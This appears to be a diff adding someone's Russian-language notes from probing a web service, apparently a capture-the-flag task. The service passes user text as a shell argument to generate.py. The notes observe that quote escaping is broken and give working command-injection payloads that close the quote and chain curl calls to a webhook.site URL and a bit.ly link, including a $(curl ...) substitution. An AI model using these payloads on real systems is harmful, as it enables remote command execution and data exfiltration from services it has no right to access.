@@ -1,0 +1,26 @@
+replace заменяет слеши \" только один раз
+
+нет! он заменяет " на пробел
+
+запускается:
+python3 generate.py SDVJFHVJD.png "текст без слешей"
+
+создаётся url для статического файла images/SDVJFHVJD.jpg
+
+нужно получить доступ к файлу в корне
+
+
+аааа там доступ к консоли в text
+&& run something
+
+text:
+blabla"
+
+python3 generate.py 
+
+ставим кавычку!! и пишем команду
+
+blabla\u0022; curl \u0022https://webhook.site/02cf5e63-fe6a-46ef-8aa3-853eeb1ae21c
+b";curl "https://bit.ly/3AmFord
+
+blabla $(curl https://webhook.site/02cf5e63-fe6a-46ef-8aa3-853eeb1ae21c)
